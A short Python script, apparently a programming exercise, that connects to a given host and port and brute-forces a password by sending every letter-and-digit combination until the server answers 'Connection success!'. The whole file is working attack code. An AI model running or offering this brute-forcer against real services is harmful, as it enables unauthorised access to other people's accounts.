import socket
import sys
import itertools


alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
args = sys.argv
# working with a socket as a context manager
with socket.socket() as client_socket:
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)
    client_socket.connect(address)
    while True:
        for i in range(1000000):
            for item in itertools.product(alphabet, repeat=i + 1):
                password = ''.join(item).encode()

                client_socket.send(password)

                response = client_socket.recv(1024)

                if response.decode() == 'Connection success!':
                    print(password.decode())
                    exit()
                else:
                    continue
